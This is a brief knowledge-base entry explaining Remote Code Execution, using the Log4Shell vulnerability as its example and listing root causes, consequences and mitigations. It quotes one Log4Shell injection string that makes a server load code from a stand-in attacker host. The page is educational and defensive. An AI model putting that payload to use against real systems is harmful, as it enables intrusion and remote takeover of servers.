# RCE

## What it is
Imagine mailing someone a letter that, when opened, forces their hands to type whatever you wrote — that's RCE. Remote Code Execution is a vulnerability class that allows an attacker to run arbitrary code on a target system across a network, without physical access or prior authentication in the most severe cases.

## Why it matters
In 2021, the Log4Shell vulnerability (CVE-2021-44228) enabled unauthenticated RCE against any system using the Java Log4j library — simply by logging a crafted string like `${jndi:ldap://attacker.com/exploit}`. Within 72 hours of disclosure, attackers were actively deploying crypto miners, ransomware, and reverse shells against millions of vulnerable servers worldwide, demonstrating how a single RCE flaw can cascade into complete infrastructure compromise.

## Key facts
- RCE is classified as **Critical** (CVSS 9.0–10.0) because it grants full control over the target system without requiring local access
- Common root causes include **deserialization flaws**, **command injection**, **buffer overflows**, and **template injection** — essentially any path where attacker-controlled input reaches an execution context
- RCE is frequently the **end goal** of exploit chains — attackers may combine an authentication bypass + a local privilege escalation to achieve it
- Successful RCE often leads directly to **persistence mechanisms** (backdoors, cron jobs), **lateral movement**, and **data exfiltration**
- Mitigations include **input validation**, **sandboxing**, **least privilege execution**, **WAFs**, and rapid **patch management** — defense-in-depth is essential because no single control stops all RCE vectors

## Related concepts
[[Command Injection]] [[Deserialization Vulnerabilities]] [[Buffer Overflow]] [[Privilege Escalation]] [[Reverse Shell]]